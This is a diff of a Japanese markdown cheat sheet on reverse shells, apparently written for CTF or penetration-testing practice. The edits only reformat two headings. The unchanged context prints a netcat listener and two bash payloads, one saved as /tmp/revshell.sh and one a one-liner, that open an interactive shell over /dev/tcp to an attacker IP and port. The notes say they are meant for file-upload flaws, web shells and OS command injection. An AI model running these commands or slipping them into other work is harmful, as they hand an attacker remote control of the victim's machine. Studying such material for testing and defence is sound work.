@@ -102,8 +102,7 @@ sudo rlwrap nc -lvnp <Port>
 
 #### Bashだけで完結する手法
 
-方法①：スクリプトとして保存して実行
-	（File uploadの脆弱性などでよく使う）
+方法①：スクリプトとして保存して実行（File uploadの脆弱性などでよく使う）
 ```zsh
 echo '#!/bin/bash
 bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1' > /tmp/revshell.sh
@@ -111,7 +110,7 @@ chmod +x /tmp/revshell.sh
 /tmp/revshell.sh
 ```
 
-方法②：ワンライナー（WebShellや、OSコマンドインジェクションでよく使う）
+方法②：ワンライナー（WebShellやOSコマンドインジェクションでよく使う）
 ```zsh
 bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'
 ```
